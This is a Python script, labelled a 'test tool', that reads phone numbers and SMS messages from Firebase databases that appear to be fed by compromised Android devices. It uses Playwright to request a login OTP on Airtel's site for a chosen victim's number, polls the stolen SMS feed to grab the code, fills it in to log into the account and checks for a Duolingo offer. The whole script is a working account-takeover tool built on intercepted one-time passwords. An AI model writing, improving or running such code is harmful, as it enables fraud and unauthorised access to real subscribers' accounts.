#!/usr/bin/env python3
"""
Airtel Duolingo Manual Test Tool
Run: python airtel_manual_test.py
"""

import asyncio
import aiohttp
import re
import sys

# ── CONFIG ────────────────────────────────────────────────────────────────────
print("Firebase URLs (comma separated, e.g. https://aaa-rtdb.firebaseio.com,https://bbb-rtdb.firebaseio.com):")
raw_urls = input("> ").strip()
FIREBASE_URLS = [u.strip().rstrip("/") for u in raw_urls.split(",") if u.strip()]

print("Firebase Auth Key (leave blank if none):")
FIREBASE_KEY = input("> ").strip()

AIRTEL_LOGIN_URL  = "https://www.airtel.in/manage-account/login"
AIRTEL_THANKS_URL = "https://www.airtel.in/thanks/"

# ── FIREBASE HELPERS ──────────────────────────────────────────────────────────

def fb_url(base, path, extra=""):
    url = f"{base}/{path}"
    params = []
    if FIREBASE_KEY:
        params.append(f"auth={FIREBASE_KEY}")
    if extra:
        params.append(extra)
    if params:
        url += "?" + "&".join(params)
    return url

REGIONAL_DIGITS = str.maketrans(
    "०१२३४५६७८९" "০১২৩৪৫৬৭৮৯" "੦੧੨੩੪੫੬੭੮੯",
    "0123456789" * 3
)

def normalize(text):
    return text.translate(REGIONAL_DIGITS)

async def get_devices(session):
    devices = []
    for fb_base in FIREBASE_URLS:
        db_name = fb_base.split("//")[-1].split(".")[0] if "//" in fb_base else fb_base
        try:
            async with session.get(fb_url(fb_base, "clients.json"), timeout=aiohttp.ClientTimeout(total=20)) as r:
                data = await r.json()
            if not isinstance(data, dict):
                continue
            for dev_id, info in data.items():
                if not isinstance(info, dict):
                    continue
                phone = str(info.get("phone") or info.get("number") or info.get("mobile") or "").strip().lstrip("+").lstrip("91")
                if len(phone) == 10:
                    devices.append({"device_id": dev_id, "phone": phone, "fb_base": fb_base, "db_name": db_name})
        except Exception as e:
            print(f"  ⚠ Scan error {db_name}: {e}")
    return devices

async def get_msg_keys(session, fb_base, device_id):
    try:
        async with session.get(fb_url(fb_base, f"messages/{device_id}.json", "shallow=true"), timeout=aiohttp.ClientTimeout(total=15)) as r:
            data = await r.json()
        return set(data.keys()) if isinstance(data, dict) else set()
    except Exception:
        return set()

async def poll_otp(session, fb_base, device_id, known_keys, timeout=120):
    import time
    deadline = time.time() + timeout
    print("  Polling", end="", flush=True)
    while time.time() < deadline:
        try:
            async with session.get(fb_url(fb_base, f"messages/{device_id}.json", "shallow=true"), timeout=aiohttp.ClientTimeout(total=10)) as r:
                shallow = await r.json()
            if isinstance(shallow, dict):
                new_keys = [k for k in shallow if k not in known_keys]
                for key in new_keys:
                    async with session.get(fb_url(fb_base, f"messages/{device_id}/{key}.json"), timeout=aiohttp.ClientTimeout(total=10)) as r:
                        msg = await r.json()
                    if isinstance(msg, dict):
                        text = ""
                        for field in ("message", "body", "text", "content", "smsBody"):
                            v = msg.get(field, "")
                            if v and isinstance(v, str):
                                text = v; break
                        if not text:
                            text = str(msg)
                        m = re.search(r'(?<!\d)(\d{4,6})(?!\d)', normalize(text))
                        if m:
                            print(f" ✓")
                            return m.group(1)
                    known_keys.add(key)
        except Exception:
            pass
        print(".", end="", flush=True)
        await asyncio.sleep(2.5)
    print(" timeout")
    return None

# ── MAIN ──────────────────────────────────────────────────────────────────────

async def main():
    from playwright.async_api import async_playwright

    async with aiohttp.ClientSession() as session:
        print(f"\n📡 Scanning {len(FIREBASE_URLS)} Firebase DB(s)...")
        devices = await get_devices(session)
        if not devices:
            print("❌ No devices found.")
            return

        print(f"\n✅ Found {len(devices)} devices:\n")
        for i, d in enumerate(devices):
            print(f"  [{i+1:3}] +91{d['phone']}  [{d['db_name']}]")

        print(f"\nSelect number [1-{len(devices)}], enter phone number, or 'q' to quit:")
        choice = input("> ").strip()

        if choice.lower() == 'q':
            return

        if choice.isdigit() and 1 <= int(choice) <= len(devices):
            selected = devices[int(choice)-1]
        else:
            phone = choice.lstrip("+").lstrip("91")
            matched = [d for d in devices if d["phone"] == phone]
            if not matched:
                print(f"❌ Phone {phone} not found.")
                return
            selected = matched[0]

        phone     = selected["phone"]
        device_id = selected["device_id"]
        fb_base   = selected["fb_base"]
        print(f"\n🚀 Testing +91{phone}  [{selected['db_name']}]\n")

        known_keys = await get_msg_keys(session, fb_base, device_id)
        print(f"📸 Firebase snapshot: {len(known_keys)} existing messages\n")

        async with async_playwright() as pw:
            print("🌐 Opening Chrome...")
            browser = await pw.chromium.launch(headless=False, slow_mo=200)
            ctx = await browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                viewport={"width": 1280, "height": 800},
            )
            page = await ctx.new_page()

            # ── Login ────────────────────────────────────────────────────────
            print(f"→ {AIRTEL_LOGIN_URL}")
            await page.goto(AIRTEL_LOGIN_URL, wait_until="domcontentloaded", timeout=60000)
            await asyncio.sleep(3)

            filled = False
            for sel in ['input[placeholder*="mobile" i]', 'input[type="tel"]',
                        'input[maxlength="10"]', 'input[name*="mobile" i]', 'input[id*="mobile" i]']:
                try:
                    el = page.locator(sel).first
                    if await el.count() > 0:
                        await el.wait_for(state="visible", timeout=3000)
                        await el.fill(phone)
                        filled = True
                        print(f"  ✓ Phone filled")
                        break
                except Exception:
                    continue

            if not filled:
                print("  ⚠ Phone input not found — fill manually in browser")
                input("  Press ENTER after requesting OTP...")
            else:
                await asyncio.sleep(1)
                for sel in ['button:has-text("Send OTP")', 'button:has-text("SEND OTP")',
                            'button:has-text("Get OTP")',  'button:has-text("GET OTP")',
                            'button:has-text("Generate OTP")', 'button[type="submit"]']:
                    try:
                        el = page.locator(sel).first
                        if await el.count() > 0:
                            await el.wait_for(state="visible", timeout=3000)
                            await el.click()
                            print(f"  ✓ OTP requested")
                            break
                    except Exception:
                        continue

            # ── OTP ──────────────────────────────────────────────────────────
            print()
            otp = await poll_otp(session, fb_base, device_id, known_keys, timeout=90)
            if otp:
                print(f"🔔 OTP: {otp}")
            else:
                otp = input("Enter OTP manually (or ENTER to skip): ").strip()
            if not otp:
                print("⏭ Skipping — no OTP.")
                await browser.close()
                again = input("\nTest another number? [y/n]: ").strip().lower()
                if again == 'y':
                    await main()
                return

            # Fill OTP in browser
            otp_filled = False
            for sel in ['input[placeholder*="OTP" i]', 'input[maxlength="4"]',
                        'input[maxlength="6"]', 'input[type="number"]']:
                try:
                    inputs = await page.locator(sel).all()
                    if len(inputs) >= 4:
                        for i, digit in enumerate(otp[:len(inputs)]):
                            await inputs[i].fill(digit)
                            await asyncio.sleep(0.1)
                        otp_filled = True; break
                    elif inputs:
                        await inputs[0].fill(otp)
                        otp_filled = True; break
                except Exception:
                    continue

            if not otp_filled:
                print("  ⚠ OTP input not found — fill manually in browser")
                input("  Press ENTER after clicking Login...")
            else:
                await asyncio.sleep(1)
                for sel in ['button:has-text("LOGIN")', 'button:has-text("Login")',
                            'button:has-text("Verify")', 'button:has-text("VERIFY")',
                            'button:has-text("Submit")', 'button:has-text("Continue")']:
                    try:
                        el = page.locator(sel).first
                        if await el.count() > 0:
                            await el.wait_for(state="visible", timeout=5000)
                            await el.click()
                            print(f"  ✓ Login clicked")
                            break
                    except Exception:
                        continue
                await asyncio.sleep(4)

            # ── Thanks page ───────────────────────────────────────────────────
            print(f"\n→ {AIRTEL_THANKS_URL}")
            await page.goto(AIRTEL_THANKS_URL, wait_until="domcontentloaded", timeout=60000)
            await asyncio.sleep(4)

            body = await page.inner_text("body")
            has_duo = "duolingo" in body.lower()

            if has_duo:
                print("\n✅ Duolingo offer FOUND on this number!")
            else:
                print("\n❌ No Duolingo offer on this number")

            print("\nBrowser stays open. Close it when done, or press ENTER to test another number.")
            input()
            await browser.close()

        # Test another?
        again = input("\nTest another number? [y/n]: ").strip().lower()
        if again == 'y':
            await main()

if __name__ == "__main__":
    asyncio.run(main())
